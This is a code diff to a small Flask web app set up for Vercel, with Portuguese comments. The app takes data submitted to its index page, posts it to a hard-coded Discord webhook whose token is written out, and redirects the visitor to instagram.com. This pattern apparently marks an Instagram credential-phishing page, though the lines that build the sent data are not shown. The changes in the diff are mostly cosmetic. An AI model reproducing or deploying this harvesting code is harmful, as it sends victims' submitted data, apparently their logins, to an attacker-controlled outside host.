@@ -1,16 +1,18 @@
+import os
 from flask import Flask, request, render_template, redirect, send_from_directory
 import requests
-import os
 
-app = Flask(__name__,
-            static_folder=os.path.join(os.path.dirname(__file__), '../static'),
-            template_folder=os.path.join(os.path.dirname(__file__), '../templates'))
+app = Flask(
+    __name__,
+    static_folder=os.path.abspath(os.path.join(os.path.dirname(__file__), "../static")),
+    template_folder=os.path.abspath(os.path.join(os.path.dirname(__file__), "../templates"))
+)
 
 WEBHOOK = "https://discord.com/api/webhooks/1356844204608721017/GB-N9jMt__CmHGiFaJUAOg_doQBZTNH0GjOoTwekMa_SBmIff-NKyk91FUDDQuhfCQE2"
 
 @app.route("/img/<path:filename>")
 def serve_img(filename):
-    return send_from_directory(os.path.join(os.path.dirname(__file__), "../img"), filename)
+    return send_from_directory(os.path.abspath(os.path.join(os.path.dirname(__file__), "../img")), filename)
 
 @app.route("/", methods=["GET", "POST"])
 def index():
@@ -39,11 +41,11 @@ def index():
         try:
             requests.post(WEBHOOK, json=data)
         except Exception as e:
-            print("[!] Webhook falhou:", e)
+            print(f"[!] Erro ao enviar webhook: {e}")
 
         return redirect("https://www.instagram.com")
 
     return render_template("index.html")
 
-# ✅ necessário para Vercel
+# NECESSÁRIO para Vercel
 handler = app
